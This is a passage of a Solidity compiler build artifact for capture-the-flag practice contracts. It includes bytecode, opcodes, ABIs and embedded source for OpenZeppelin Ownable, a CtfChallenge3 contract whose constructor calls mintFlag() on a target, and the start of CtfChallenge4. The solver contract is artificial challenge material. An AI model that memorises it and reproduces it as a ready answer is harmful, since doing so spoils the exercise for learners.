ntifier","src":"1276:3:14"},"nativeSrc":"1276:23:14","nodeType":"YulFunctionCall","src":"1276:23:14"},{"kind":"number","nativeSrc":"1301:2:14","nodeType":"YulLiteral","src":"1301:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"1272:3:14","nodeType":"YulIdentifier","src":"1272:3:14"},"nativeSrc":"1272:32:14","nodeType":"YulFunctionCall","src":"1272:32:14"},"nativeSrc":"1269:119:14","nodeType":"YulIf","src":"1269:119:14"},{"nativeSrc":"1398:117:14","nodeType":"YulBlock","src":"1398:117:14","statements":[{"nativeSrc":"1413:15:14","nodeType":"YulVariableDeclaration","src":"1413:15:14","value":{"kind":"number","nativeSrc":"1427:1:14","nodeType":"YulLiteral","src":"1427:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1417:6:14","nodeType":"YulTypedName","src":"1417:6:14","type":""}]},{"nativeSrc":"1442:63:14","nodeType":"YulAssignment","src":"1442:63:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1477:9:14","nodeType":"YulIdentifier","src":"1477:9:14"},{"name":"offset","nativeSrc":"1488:6:14","nodeType":"YulIdentifier","src":"1488:6:14"}],"functionName":{"name":"add","nativeSrc":"1473:3:14","nodeType":"YulIdentifier","src":"1473:3:14"},"nativeSrc":"1473:22:14","nodeType":"YulFunctionCall","src":"1473:22:14"},{"name":"dataEnd","nativeSrc":"1497:7:14","nodeType":"YulIdentifier","src":"1497:7:14"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"1452:20:14","nodeType":"YulIdentifier","src":"1452:20:14"},"nativeSrc":"1452:53:14","nodeType":"YulFunctionCall","src":"1452:53:14"},"variableNames":[{"name":"value0","nativeSrc":"1442:6:14","nodeType":"YulIdentifier","src":"1442:6:14"}]}]}]},"name":"abi_decode_tuple_t_address","nativeSrc":"1193:329:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1229:9:14","nodeType":"YulTypedName","src":"1229:9:14","type":""},{"name":"dataEnd","nativeSrc":"1240:7:14","nodeType":"YulTypedName","src":"1240:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"1252:6:14","nodeType":"YulTypedName","src":"1252:6:14","type":""}],"src":"1193:329:14"}]},"contents":"{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106100415760003560e01c8063715018a6146100465780638da5cb5b14610050578063f2fde38b1461006e575b600080fd5b61004e61008a565b005b61005861009e565b60405161006591906102e1565b60405180910390f35b6100886004803603810190610083919061032d565b6100c7565b005b61009261014d565b61009c60006101d4565b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6100cf61014d565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036101415760006040517f1e4fbdf700000000000000000000000000000000000000000000000000000000815260040161013891906102e1565b60405180910390fd5b61014a816101d4565b50565b610155610298565b73ffffffffffffffffffffffffffffffffffffffff1661017361009e565b73ffffffffffffffffffffffffffffffffffffffff16146101d257610196610298565b6040517f118cdaa70000000000000000000000000000000000000000000000000000000081526004016101c991906102e1565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102cb826102a0565b9050919050565b6102db816102c0565b82525050565b60006020820190506102f660008301846102d2565b92915050565b600080fd5b61030a816102c0565b811461031557600080fd5b50565b60008135905061032781610301565b92915050565b600060208284031215610343576103426102fc565b5b600061035184828501610318565b9150509291505056fea2646970667358221220a22e105573b874ade19c54b93cc7846914aaf9c461c41235495a1ff66982275a64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8A JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x9E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x2E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x88 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x32D JUMP JUMPDEST PUSH2 0xC7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x92 PUSH2 0x14D JUMP JUMPDEST PUSH2 0x9C PUSH1 0x0 PUSH2 0x1D4 JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0xCF PUSH2 0x14D JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x141 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x138 SWAP2 SWAP1 PUSH2 0x2E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x14A DUP2 PUSH2 0x1D4 JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x155 PUSH2 0x298 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x173 PUSH2 0x9E JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1D2 JUMPI PUSH2 0x196 PUSH2 0x298 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1C9 SWAP2 SWAP1 PUSH2 0x2E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2CB DUP3 PUSH2 0x2A0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2DB DUP2 PUSH2 0x2C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2F6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x30A DUP2 PUSH2 0x2C0 JUMP JUMPDEST DUP2 EQ PUSH2 0x315 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x327 DUP2 PUSH2 0x301 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x343 JUMPI PUSH2 0x342 PUSH2 0x2FC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x351 DUP5 DUP3 DUP6 ADD PUSH2 0x318 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG2 0x2E LT SSTORE PUSH20 0xB874ADE19C54B93CC7846914AAF9C461C4123549 GAS 0x1F 0xF6 PUSH10 0x82275A64736F6C634300 ADDMOD SHR STOP CALLER ","sourceMap":"209:126:10:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2293:101:0;;;:::i;:::-;;1638:85;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2543:215;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;2293:101;1531:13;:11;:13::i;:::-;2357:30:::1;2384:1;2357:18;:30::i;:::-;2293:101::o:0;1638:85::-;1684:7;1710:6;;;;;;;;;;;1703:13;;1638:85;:::o;2543:215::-;1531:13;:11;:13::i;:::-;2647:1:::1;2627:22;;:8;:22;;::::0;2623:91:::1;;2700:1;2672:31;;;;;;;;;;;:::i;:::-;;;;;;;;2623:91;2723:28;2742:8;2723:18;:28::i;:::-;2543:215:::0;:::o;1796:162::-;1866:12;:10;:12::i;:::-;1855:23;;:7;:5;:7::i;:::-;:23;;;1851:101;;1928:12;:10;:12::i;:::-;1901:40;;;;;;;;;;;:::i;:::-;;;;;;;;1851:101;1796:162::o;2912:187::-;2985:16;3004:6;;;;;;;;;;;2985:25;;3029:8;3020:6;;:17;;;;;;;;;;;;;;;;;;3083:8;3052:40;;3073:8;3052:40;;;;;;;;;;;;2975:124;2912:187;:::o;656:96:1:-;709:7;735:10;728:17;;656:96;:::o;7:126:14:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;674:117::-;783:1;780;773:12;920:122;993:24;1011:5;993:24;:::i;:::-;986:5;983:35;973:63;;1032:1;1029;1022:12;973:63;920:122;:::o;1048:139::-;1094:5;1132:6;1119:20;1110:29;;1148:33;1175:5;1148:33;:::i;:::-;1048:139;;;;:::o;1193:329::-;1252:6;1301:2;1289:9;1280:7;1276:23;1272:32;1269:119;;;1307:79;;:::i;:::-;1269:119;1427:1;1452:53;1497:7;1488:6;1477:9;1473:22;1452:53;:::i;:::-;1442:63;;1398:117;1193:329;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"182400","executionCost":"infinite","totalCost":"infinite"},"external":{"owner()":"2522","renounceOwnership()":"infinite","transferOwnership(address)":"infinite"}},"methodIdentifiers":{"owner()":"8da5cb5b","renounceOwnership()":"715018a6","transferOwnership(address)":"f2fde38b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge3.sol\":\"CtfChallenge3\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/CtfChallenge3.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\nimport {Ownable} from \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\n// Uncomment this line to use console.log\\n// import \\\"hardhat/console.sol\\\";\\n\\ncontract CtfChallenge3 is Ownable {\\n  constructor(address target) Ownable(msg.sender) {\\n    ITarget(target).mintFlag();\\n  }\\n\\n}\\n\\ninterface ITarget {\\n  function mintFlag() external;\\n}\\n\",\"keccak256\":\"0xe74ce3720a8012a3542c6cab294feedc2bcdf46c8cbaba3bc8771f65a653dfdf\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[{"astId":8,"contract":"contracts/CtfChallenge3.sol:CtfChallenge3","label":"_owner","offset":0,"slot":"0","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}},"ITarget":{"abi":[{"inputs":[],"name":"mintFlag","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"mintFlag()":"e00d023f"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"mintFlag\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge3.sol\":\"ITarget\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/CtfChallenge3.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\nimport {Ownable} from \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\n// Uncomment this line to use console.log\\n// import \\\"hardhat/console.sol\\\";\\n\\ncontract CtfChallenge3 is Ownable {\\n  constructor(address target) Ownable(msg.sender) {\\n    ITarget(target).mintFlag();\\n  }\\n\\n}\\n\\ninterface ITarget {\\n  function mintFlag() external;\\n}\\n\",\"keccak256\":\"0xe74ce3720a8012a3542c6cab294feedc2bcdf46c8cbaba3bc8771f65a653dfdf\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/CtfChallenge4.sol":{"CtfChallenge4":{"abi":[{"anonymous":false,"inputs":[{"indexed":false,"internalType":"bytes32","name":"theHash","type":"bytes32"}],"name":"HashCalculated","type":"event"},{"inputs":[],"name":"mintFlag","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"6080604052348015600f57600080fd5b506102328061001f6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063e00d023f14610030575b600080fd5b61003861004e565b6040516100459190610115565b60405180910390f35b6000803360405160200161006291906101ce565b6040516020818303038152906040528051906020012090506000610085826100c6565b90507f3d7cf2e7e9e20d5274ee168f6f51d48502ab06f1d11a284e66b34b7c09e5ad1e816040516100b69190610115565b60405180910390a1809250505090565b60007f19457468657265756d205369676e6564204d6573736167653a0a33320000000060005281601c52603c6000209050919050565b6000819050919050565b61010f816100fc565b82525050565b600060208201905061012a6000830184610106565b92915050565b600082825260208201905092915050565b7f424720435446204368616c6c656e676520340000000000000000000000000000600082015250565b6000610177601283610130565b915061018282610141565b602082019050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101b88261018d565b9050919050565b6101c8816101ad565b82525050565b600060408201905081810360008301526101e78161016a565b90506101f660208301846101bf565b9291505056fea264697066735822122041cf0bd5e6f7eca2dcea05a54f6f1f0fc9a7eda56a09fa7c36cc44432169189164736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x232 DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xE00D023F EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x115 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 CALLER PUSH1 0x40 MLOAD PUSH1 